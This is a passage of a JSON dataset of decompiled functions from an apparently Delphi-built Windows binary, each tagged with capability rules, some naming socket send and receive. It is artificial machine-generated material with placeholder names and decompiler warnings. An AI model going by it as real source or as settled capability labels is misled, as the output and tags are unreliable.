        "decompiled_code": "\nvoid __cdecl fcn.0046b22c(int32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    \n    cVar1 = fcn.00468b68();\n    if (cVar1 == '\\0') {\n        *(in_EAX + 0x24) = 0;\n    }\n    else {\n        iVar2 = fcn.00468c20();\n        *(in_EAX + 0x24) = *(in_EAX + 0x20) - iVar2;\n    }\n    if (*(in_EAX + 0x14) != 0) {\n        cVar1 = fcn.00468be8();\n        if (cVar1 == '\\0') {\n            fcn.0046b22c(arg_8h);\n        }\n    }\n    iVar2 = fcn.004691f0();\n    if (iVar2 != 0) {\n        fcn.004691f0();\n        fcn.00469144();\n    }\n    fcn.004694c4(0x46afc0, *(arg_8h + -4));\n    return;\n}\n",
        "token_count": 255
    },
    "0046d56c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0046d56c(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    if ((*(in_EAX + 0x4c) != 0) && (iVar2 = *(*(in_EAX + 0x4c) + 8),  -1 < iVar2 + -1)) {\n        do {\n            iVar1 = fcn.00419610();\n            if (param_2 == iVar1) {\n                *(param_2 + 4) = 0;\n                fcn.00419504();\n                return;\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    return;\n}\n",
        "token_count": 175
    },
    "0046ebac": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0046ebac(uint param_1, uint param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t *piVar1;\n    int32_t iVar2;\n    uchar in_ZF;\n    \n    fcn.00405894(param_2);\n    if (!in_ZF) {\n        iVar2 = *(in_EAX[0x14] + 8);\n        if (-1 < iVar2 + -1) {\n            do {\n                piVar1 = fcn.004047f0();\n                if (piVar1 != NULL) {\n                    (**(*piVar1 + 0x4c))();\n                }\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n        fcn.004054c0();\n        (**(*in_EAX + 0x30))();\n    }\n    return;\n}\n",
        "token_count": 194
    },
    "0046eeb0": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0046eeb0(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t *piVar1;\n    int32_t iVar2;\n    \n    if (param_2 != in_EAX[0x20]) {\n        iVar2 = *(in_EAX[0x14] + 8);\n        if (-1 < iVar2 + -1) {\n            do {\n                piVar1 = fcn.004047f0();\n                if (piVar1 != NULL) {\n                    (**(*piVar1 + 0x6c))();\n                }\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n        in_EAX[0x20] = param_2;\n        (**(*in_EAX + 0x30))();\n    }\n    return;\n}\n",
        "token_count": 193
    },
    "0046ef0c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0046ef0c(uint param_1, int16_t param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t *piVar1;\n    int32_t iVar2;\n    \n    if (param_2 != *(in_EAX + 0x21)) {\n        iVar2 = *(in_EAX[0x14] + 8);\n        if (-1 < iVar2 + -1) {\n            do {\n                piVar1 = fcn.004047f0();\n                if (piVar1 != NULL) {\n                    (**(*piVar1 + 0x70))();\n                }\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n        *(in_EAX + 0x21) = param_2;\n        (**(*in_EAX + 0x30))();\n    }\n    return;\n}\n",
        "token_count": 196
    },
    "0046ef70": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0046ef70(uint param_1, char param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t *piVar1;\n    int32_t iVar2;\n    \n    if (param_2 != *(in_EAX + 0x86)) {\n        iVar2 = *(in_EAX[0x14] + 8);\n        if (-1 < iVar2 + -1) {\n            do {\n                piVar1 = fcn.004047f0();\n                if (piVar1 != NULL) {\n                    (**(*piVar1 + 0x74))();\n                }\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n        *(in_EAX + 0x86) = param_2;\n        (**(*in_EAX + 0x30))();\n    }\n    return;\n}\n",
        "token_count": 193
    },
    "0046f108": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nulong __fastcall fcn.0046f108(uint param_1, int16_t param_2)\n\n{\n    int32_t iVar1;\n    int16_t iVar2;\n    int32_t *in_EAX;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iStack20;\n    \n    iStack20 = -1;\n    iVar3 = (**(*in_EAX + 0x14))();\n    iVar1 = iStack20;\n    if (-1 < iVar3 + -1) {\n        iVar4 = 0;\n        do {\n            iVar2 = (**(*in_EAX + 0x18))();\n            iVar1 = iVar4;\n            if (param_2 == iVar2) break;\n            iVar4 = iVar4 + 1;\n            iVar3 = iVar3 + -1;\n            iVar1 = iStack20;\n        } while (iVar3 != 0);\n    }\n    iStack20 = iVar1;\n    return CONCAT44(iStack20, iStack20);\n}\n",
        "token_count": 220
    },
    "004715bc": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.004715bc(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    \n    if (in_EAX != NULL) {\n        do {\n            iVar1 = sub.user32.dll_IsWindow(in_EAX[1]);\n            if (iVar1 != 0) {\n                sub.user32.dll_EnableWindow(in_EAX[1], 0xffffffff);\n            }\n            in_EAX = *in_EAX;\n            fcn.00402f0c();\n        } while (in_EAX != NULL);\n    }\n    return;\n}\n",
        "token_count": 122
    },
    "004751cc": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint fcn.004751cc(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    \n    uVar1 = fcn.00466ca8(2);\n    iVar2 = (***0x4a4e18)(uVar1);\n    iVar3 = fcn.004799ac();\n    if (-1 < iVar3 + -1) {\n        do {\n            iVar4 = fcn.00479998();\n            if (iVar2 == *(iVar4 + 4)) {\n                uVar1 = fcn.00479998();\n                return uVar1;\n            }\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != 0);\n    }\n    fcn.0047a884();\n    iVar3 = fcn.004799ac();\n    if (-1 < iVar3 + -1) {\n        do {\n            iVar4 = fcn.00479998();\n            if (iVar2 == *(iVar4 + 4)) {\n                uVar1 = fcn.00479998();\n                return uVar1;\n            }\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != 0);\n    }\n    return 0;\n}\n",
        "token_count": 273
    },
    "00476c50": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00476c50(int32_t param_1, int32_t param_2)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t iVar3;\n    \n    if (param_2 != 0) {\n        do {\n            iVar3 = param_2;\n            param_2 = *(iVar3 + 0x30);\n            if (param_2 == 0) break;\n            cVar1 = fcn.004047cc();\n        } while (cVar1 == '\\0');\n        if ((iVar3 != 0) && (param_1 != iVar3)) {\n            uVar2 = fcn.00466ca8();\n            sub.user32.dll_SendMessageA(uVar2);\n        }\n    }\n    return;\n}\n",
        "token_count": 169
    },
    "00479b48": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00479b48(void)\n\n{\n    uint *puVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    \n    puVar1 = *(in_EAX + 0x5c);\n    while (puVar1 != NULL) {\n        iVar2 = puVar1[1];\n        if ((((-0x12 < iVar2) && (iVar2 < -0xb)) || (iVar2 == -0x15)) || (0 < iVar2)) {\n            sub.user32.dll_DestroyCursor();\n        }\n        puVar1 = *puVar1;\n        fcn.00402f0c();\n    }\n    iVar2 = sub.user32.dll_LoadCursorA(0, 0x7f00);\n    if (iVar2 != *(in_EAX + 0x60)) {\n        sub.user32.dll_DestroyCursor(*(in_EAX + 0x60));\n    }\n    return;\n}\n",
        "token_count": 202
    },
    "0047a84c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0047a84c(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    iVar1 = *(*(in_EAX + 0x58) + 8);\n    if (-1 < iVar1 + -1) {\n        do {\n            fcn.00419610();\n            fcn.00404640();\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    (**(**(*0x4ab07c + 0x58) + 8))();\n    return;\n}\n",
        "token_count": 126
    },
    "0047a8a8": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint fcn.0047a8a8(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint uVar3;\n    \n    iVar2 = fcn.004799ac();\n    if (-1 < iVar2 + -1) {\n        do {\n            fcn.00479998();\n            cVar1 = fcn.0047970c();\n            if (cVar1 != '\\0') {\n                uVar3 = fcn.00479998();\n                return uVar3;\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    fcn.0047a884();\n    iVar2 = fcn.004799ac();\n    if (-1 < iVar2 + -1) {\n        do {\n            fcn.00479998();\n            cVar1 = fcn.0047970c();\n            if (cVar1 != '\\0') {\n                uVar3 = fcn.00479998();\n                return uVar3;\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    return 0;\n}\n",
        "token_count": 249
    },
    "0047b018": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0047b018(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar1 = fcn.004066a4();\n    if (-1 < iVar1) {\n        iVar1 = iVar1 + 1;\n        iVar2 = 0;\n        do {\n            if (param_2 == *(*(in_EAX + 0xd0) + 4 + iVar2 * 0xc)) {\n                *(*(in_EAX + 0xd0) + 4 + iVar2 * 0xc) = 0;\n                *(*(in_EAX + 0xd0) + iVar2 * 0xc) = 0xffffffff;\n                return;\n            }\n            iVar2 = iVar2 + 1;\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return;\n}\n",
        "token_count": 211
    },
    "0047c9c4": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0047c9c4(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    uint uVar4;\n    int32_t iVar5;\n    \n    iVar2 = fcn.004799f8();\n    if (-1 < iVar2 + -1) {\n        do {\n            piVar3 = fcn.004799e4();\n            cVar1 = fcn.00466fb4();\n            if (cVar1 != '\\0') {\n                uVar4 = fcn.00466ca8();\n                iVar5 = sub.user32.dll_IsWindowVisible(uVar4);\n                if (iVar5 != 0) {\n                    uVar4 = fcn.00466ca8();\n                    iVar5 = sub.user32.dll_IsWindowEnabled(uVar4);\n                    if (iVar5 != 0) {\n                        (**(*piVar3 + 0xec))();\n                    }\n                }\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    return;\n}\n",
        "token_count": 234
    },
    "0047cc10": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0047cc10(void)\n\n{\n    int32_t iVar1;\n    uint arg_8h;\n    \n    iVar1 = fcn.004799dc();\n    if (-1 < iVar1 + -1) {\n        do {\n            arg_8h = 0;\n            fcn.004799c8();\n            fcn.004601fc(arg_8h);\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return;\n}\n",
        "token_count": 109
    },
    "0047d9a8": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0047d9a8(uint param_1, int32_t *param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    \n    uVar3 = 0;\n    iVar1 = sub.user32.dll_GetCapture();\n    if (iVar1 == 0) {\n        iVar1 = *(in_EAX + 0x44);\n        if ((iVar1 == 0) || (*param_2 != *(iVar1 + 0x29c))) {\n            iVar1 = fcn.0045b9a4();\n            while ((iVar1 == 0 && (iVar2 = sub.user32.dll_GetParent(),  iVar2 != 0))) {\n                iVar1 = fcn.0045b9a4();\n            }\n        }\n        if (iVar1 != 0) {\n            uVar3 = fcn.0040483c();\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 219
    },
    "0047e5cc": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.0047e5cc(int32_t arg_8h)\n\n{\n    char cVar1;\n    uint16_t uVar2;\n    uint32_t *in_FS_OFFSET;\n    uint32_t uStack28;\n    uint32_t uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_1h;\n    \n    puStack16 = 0x47e5dc;\n    (**(**(arg_8h + -4) + 0x18))();\n    uStack20 = 0x47e63b;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    uStack28 = 0;\n    puStack16 = &fcn.0047e5cc::var_1h + 1;\n    uVar2 = sub.user32.dll_EnumClipboardFormats();\n    while ((uVar2 != 0 && (cVar1 = fcn.0042acb0(),  cVar1 == '\\0'))) {\n        uStack28 = uVar2;\n        uVar2 = sub.user32.dll_EnumClipboardFormats();\n    }\n    *in_FS_OFFSET = uStack28;\n    uStack20 = 0x47e642;\n    uStack24 = 0x47e63a;\n    (**(**(arg_8h + -4) + 0x14))();\n    return;\n}\n",
        "token_count": 324
    },
    "0047ecc0": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0047ecc0(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    for (iVar1 = 0; (iVar1 < *(in_EAX + 8) && (param_2 != *(*(in_EAX + 4) + iVar1 * 4))); iVar1 = iVar1 + 1) {\n    }\n    if (iVar1 == *(in_EAX + 8)) {\n        iVar1 = -1;\n    }\n    return iVar1;\n}\n",
        "token_count": 127
    },
    "00482364": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00482364(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    uint32_t uVar3;\n    uint unaff_EBX;\n    uchar *unaff_ESI;\n    uint *in_FS_OFFSET;\n    uint *arg_8h;\n    uint in_stack_ffffffd0;\n    uint var_24h;\n    uint var_20h;\n    int32_t var_1ch;\n    uchar *var_18h;\n    uchar *var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_18h = &stack0xfffffffc;\n    var_ch = 4;\n    do {\n        var_4h = 0;\n        var_ch = var_ch + -1;\n    } while (var_ch != 0);\n    var_1ch = 0x4824ae;\n    var_20h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_20h;\n    var_14h = unaff_ESI;\n    var_10h = unaff_EBX;\n    cVar1 = fcn.004824bc();\n    if (cVar1 == '\\0') {\n        uVar2 = fcn.00406f3c();\n        in_stack_ffffffd0 = *(in_EAX + 0x30);\n        uVar3 = sub.oleaut32.dll_GetActiveObject(in_stack_ffffffd0, 0, uVar2);\n        if ((uVar3 & 0x80000000) != 0) {\n            fcn.0042306c();\n        }\n    }\n    else if (cVar1 == '\\x01') {\n        fcn.0042306c();\n    }\n    else if (cVar1 == '\\x02') {\n        uVar2 = fcn.00406f3c();\n        in_stack_ffffffd0 = *(in_EAX + 0x30);\n        uVar3 = sub.oleaut32.dll_GetActiveObject(in_stack_ffffffd0, 0, uVar2);\n        if ((uVar3 & 0x80000000) != 0) {\n            arg_8h = &var_4h;\n            fcn.00423040();\n            var_14h = var_18h;\n            var_10h = CONCAT31(var_10h._1_3_, 0xb);\n            fcn.00422fb8();\n            var_ch = var_1ch;\n            var_8h._0_1_ = 0xb;\n            fcn.00407480(&var_14h);\n            fcn.0040ae94(arg_8h);\n            fcn.00422e20(0, uVar3);\n            fcn.00404eb4();\n        }\n    }\n    else if (cVar1 == '\\x03') {\n        fcn.00405dc8();\n        fcn.00423184();\n    }\n    *in_FS_OFFSET = in_stack_ffffffd0;\n    fcn.00405c48(0x4824b5);\n    fcn.00405490();\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 765
    },
    "00483afc": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.00483afc(void)\n\n{\n    int32_t iVar1;\n    \n    *0x4a4a50 = 0;\n    iVar1 = func_0x00408148();\n    while (iVar1 != 0) {\n        iVar1 = sub.user32.dll_GetWindow();\n        *0x4a4a50 = *0x4a4a50 + 1;\n    }\n    iVar1 = *0x4a4a50;\n    *0x4a4a50 = 0;\n    return iVar1;\n}\n",
        "token_count": 123
    },
    "004863d8": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2ch\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_14h\n\nvoid __fastcall fcn.004863d8(uint param_1, uint param_2)\n\n{\n    uint *in_FS_OFFSET;\n    uchar uVar1;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uchar *var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_10h = 6;\n    do {\n        var_10h = var_10h + -1;\n    } while (var_10h != 0);\n    var_18h = 0x4863fd;\n    var_8h = param_2;\n    fcn.004058ec();\n    var_18h = 0x486405;\n    fcn.004058ec();\n    uVar1 = true;\n    var_1ch = 0x486621;\n    var_20h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.004863d8::var_20h;\n    var_18h = &stack0xfffffffc;\n    fcn.00405894();\n    if (!uVar1) {\n        fcn.00405894();\n        if (!uVar1) {\n            fcn.00405894();\n            if (uVar1) {\n                fcn.0048d458();\n                fcn.0040a4d0();\n                var_2ch = var_8h;\n                fcn.00405800(var_8h, 0x48665c, var_ch);\n            }\n            fcn.00405894();\n            if (uVar1) {\n                fcn.0048d458();\n                fcn.00405784();\n            }\n            fcn.00405894();\n            if (uVar1) {\n                fcn.0048d390();\n                fcn.00405784();\n            }\n            fcn.00405894();\n            if (uVar1) {\n                fcn.00485db0();\n                fcn.00405784();\n            }\n            fcn.00405894();\n            if (uVar1) {\n                fcn.00485db0();\n                fcn.00405784();\n            }\n            fcn.00405894();\n            if (uVar1) {\n                fcn.00485db0();\n                fcn.00405784();\n            }\n            fcn.00405894();\n            if (uVar1) {\n                fcn.00485db0();\n                fcn.00405784();\n            }\n            fcn.00405894();\n            if (uVar1) {\n                fcn.00485db0();\n                fcn.00405784();\n            }\n            fcn.00405894();\n            if (uVar1) {\n                fcn.00485db0();\n                fcn.00405784();\n            }\n            fcn.00405894();\n            if (uVar1) {\n                uVar1 = 1;\n                fcn.00485db0();\n                fcn.00405784();\n            }\n            fcn.00405894();\n            if (uVar1) {\n                fcn.0048d2c8();\n                fcn.00405784();\n            }\n            goto code_r0x00486606;\n        }\n    }\n    fcn.004054c0();\ncode_r0x00486606:\n    *in_FS_OFFSET = var_2ch;\n    fcn.00405490(0x486628);\n    return;\n}\n",
        "token_count": 871
    },
    "00486de0": {
        "rules": [
            "contain loop",
            "receive data on socket",
            "receive data",
            "send data on socket",
            "send data"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00486de0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    \n    fcn.004030ec();\n    iVar1 = fcn.0047e850();\n    piVar2 = fcn.00404610();\n    fcn.0041b510(iVar1, iVar1 >> 0x1f);\n    fcn.0041b6f0();\n    fcn.0041b4ac(0, 0);\n    do {\n        iVar1 = (**(*piVar2 + 0xc))();\n        if (iVar1 == 0) break;\n        sub.wsock32.dll_send(*0x4ad278, 0x4ab278, iVar1);\n        fcn.00403ae4();\n        sub.wsock32.dll_recv(*0x4ad278, 0x4ab278, 0x1fff, 0);\n        fcn.00403ae4();\n    } while (iVar1 != 0);\n    fcn.004939cc();\n    fcn.00404640();\n    return;\n}\n",
        "token_count": 245
    },
    "00487550": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00487550(void)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x4875ce;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    fcn.004033a8();\n    fcn.0040546c();\n    iVar1 = 0x400;\n    do {\n        fcn.004033d0();\n        fcn.00405654();\n        fcn.00405738();\n        fcn.004054c0();\n        iVar1 = iVar1 + -1;\n    } while (iVar1 != 0);\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x4875d5;\n    uStack32 = 0x4875cd;\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 235
    },
    "0048794c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0048794c(void)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x4879ca;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    fcn.004033a8();\n    fcn.0040546c();\n    iVar1 = 0x400;\n    do {\n        fcn.004033d0();\n        fcn.00405654();\n        fcn.00405738();\n        fcn.004054c0();\n        iVar1 = iVar1 + -1;\n    } while (iVar1 != 0);\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x4879d1;\n    uStack32 = 0x4879c9;\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 237
    },
    "00489b70": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00489b70(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    uchar uVar3;\n    uint *puStack64;\n    uint *puStack60;\n    uchar *puStack56;\n    uint uStack52;\n    int32_t iStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_11h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_8h = 0;\n    var_ch = 0;\n    puStack40 = 0x489b88;\n    fcn.004058ec();\n    uStack44 = 0x489cc0;\n    iStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    uStack52 = 0x4ad454;\n    puStack56 = 0x489ba4;\n    puStack40 = &stack0xfffffffc;\n    sub.kernel32.dll_EnterCriticalSection();\n    puStack60 = 0x489c9e;\n    puStack64 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc0;\n    puStack56 = &stack0xfffffffc;\n    iVar1 = (**(**0x4ad450 + 0x14))();\n    if (iVar1 < 1) {\n        fcn.00404f60();\n        *in_FS_OFFSET = puStack64;\n        puStack56 = 0x489cc7;\n        puStack60 = 0x489cbf;\n        fcn.00405490();\n        return;\n    }\n    iVar1 = (**(**0x4ad450 + 0x14))();\n    if (-1 < iVar1 + -1) {\n        do {\n            (**(**0x4ad450 + 0xc))();\n            puStack60 = &fcn.00489b70::var_8h;\n            puStack64 = 0x489c02;\n            fcn.00405a48();\n            puStack64 = 0x489c12;\n            fcn.00405964();\n            puStack64 = 0x489c1f;\n            fcn.00405a48();\n            puStack64 = 0x489c2e;\n            fcn.004059a4();\n            puStack64 = &fcn.00489b70::var_ch;\n            iVar2 = fcn.00405a48();\n            uVar3 = iVar2 == 1;\n            fcn.00405964();\n            fcn.00405a48();\n            fcn.004059a4();\n            fcn.00405894();\n            if (uVar3) break;\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    *in_FS_OFFSET = puStack64;\n    puStack56 = 0x489ca5;\n    puStack60 = 0x4ad454;\n    puStack64 = 0x489c9d;\n    sub.kernel32.dll_LeaveCriticalSection();\n    return;\n}\n",
        "token_count": 675
    },
    "00489ce0": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00489ce0(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t *in_FS_OFFSET;\n    uchar uVar4;\n    uint *puStack72;\n    uint *puStack68;\n    uint *puStack64;\n    uint *puStack60;\n    int32_t iStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_8h = 0;\n    var_ch = 0;\n    var_10h = 0;\n    var_14h = 0;\n    puStack48 = 0x489cfa;\n    fcn.004058ec();\n    uStack52 = 0x489ec9;\n    iStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    puStack60 = 0x4ad454;\n    puStack64 = 0x489d12;\n    puStack48 = &stack0xfffffffc;\n    sub.kernel32.dll_EnterCriticalSection();\n    puStack68 = 0x489ea7;\n    puStack72 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb8;\n    puStack64 = &stack0xfffffffc;\n    iVar1 = (**(**0x4ad450 + 0x14))();\n    if (iVar1 < 1) {\n        fcn.00404f60();\n        *in_FS_OFFSET = puStack72;\n        puStack64 = 0x489ed0;\n        puStack68 = 0x489ec8;\n        fcn.00405490();\n        return;\n    }\n    iVar1 = (**(**0x4ad450 + 0x14))();\n    if (-1 < iVar1 + -1) {\n        do {\n            (**(**0x4ad450 + 0xc))();\n            puStack60 = &fcn.00489ce0::var_8h;\n            puStack64 = 0x489d70;\n            fcn.00405a48();\n            puStack64 = 0x489d80;\n            fcn.00405964();\n            puStack64 = 0x489d8d;\n            fcn.00405a48();\n            puStack64 = 0x489d9c;\n            fcn.004059a4();\n            puStack64 = &fcn.00489ce0::var_ch;\n            puStack68 = 0x489dad;\n            fcn.00405a48();\n            puStack68 = 0x489dbd;\n            fcn.00405964();\n            puStack68 = 0x489dca;\n            fcn.00405a48();\n            puStack68 = 0x489dd9;\n            fcn.004059a4();\n            puStack68 = &fcn.00489ce0::var_10h;\n            puStack72 = 0x489dea;\n            fcn.00405a48();\n            puStack72 = 0x489dfa;\n            fcn.00405964();\n            puStack72 = 0x489e07;\n            fcn.00405a48();\n            puStack72 = 0x489e16;\n            fcn.004059a4();\n            puStack72 = &fcn.00489ce0::var_14h;\n            iVar2 = fcn.00405a48();\n            uVar4 = iVar2 == 1;\n            fcn.00405964();\n            fcn.00405a48();\n            fcn.004059a4();\n            fcn.00405504();\n            fcn.00405894();\n            if (uVar4) {\n                uVar3 = fcn.00409dd8();\n                sub.wsock32.dll_closesocket(uVar3);\n                (**(**0x4ad450 + 0x48))();\n                break;\n            }\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    *in_FS_OFFSET = puStack72;\n    puStack64 = 0x489eae;\n    puStack68 = 0x4ad454;\n    puStack72 = 0x489ea6;\n    sub.kernel32.dll_LeaveCriticalSection();\n    return;\n}\n",
        "token_count": 971
    },
    "00489ee4": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00489ee4(void)\n\n{\n    int32_t iVar1;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack84;\n    uint uStack80;\n    uchar *puStack76;\n    uint *puStack72;\n    uint *puStack68;\n    uint *puStack64;\n    uint *puStack60;\n    uint uStack56;\n    uchar *puStack52;\n    int32_t var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack52 = &stack0xfffffffc;\n    var_4h = 0;\n    var_8h = 0;\n    var_ch = 0;\n    var_10h = 0;\n    uStack56 = 0x48a0df;\n    puStack60 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc4;\n    puStack64 = 0x4ad454;\n    puStack68 = 0x489f0c;\n    sub.kernel32.dll_EnterCriticalSection();\n    puStack72 = 0x48a0bd;\n    puStack76 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb4;\n    uStack80 = 0x489f24;\n    puStack68 = &stack0xfffffffc;\n    iVar1 = (**(**0x4ad450 + 0x14))();\n    if (0 < iVar1) {\n        uStack80 = 0x489f3c;\n        var_20h = (**(**0x4ad450 + 0x14))();\n        if (-1 < var_20h + -1) {\n            do {\n                uStack80 = 0x489f60;\n                (**(**0x4ad450 + 0xc))();\n                puStack60 = &fcn.00489ee4::var_4h;\n                puStack64 = 0x489f71;\n                fcn.00405a48();\n                puStack64 = 0x489f81;\n                fcn.00405964();\n                puStack64 = 0x489f8e;\n                fcn.00405a48();\n                puStack64 = 0x489f9d;\n                fcn.004059a4();\n                puStack64 = &fcn.00489ee4::var_8h;\n                puStack68 = 0x489fae;\n                fcn.00405a48();\n                puStack68 = 0x489fbe;\n                fcn.00405964();\n                puStack68 = 0x489fcb;\n                fcn.00405a48();\n                puStack68 = 0x489fda;\n                fcn.004059a4();\n                puStack68 = &fcn.00489ee4::var_ch;\n                puStack72 = 0x489feb;\n                fcn.00405a48();\n                puStack72 = 0x489ffb;\n                fcn.00405964();\n                puStack72 = 0x48a008;\n                fcn.00405a48();\n                puStack72 = 0x48a017;\n                fcn.004059a4();\n                puStack72 = &fcn.00489ee4::var_10h;\n                puStack76 = 0x48a028;\n                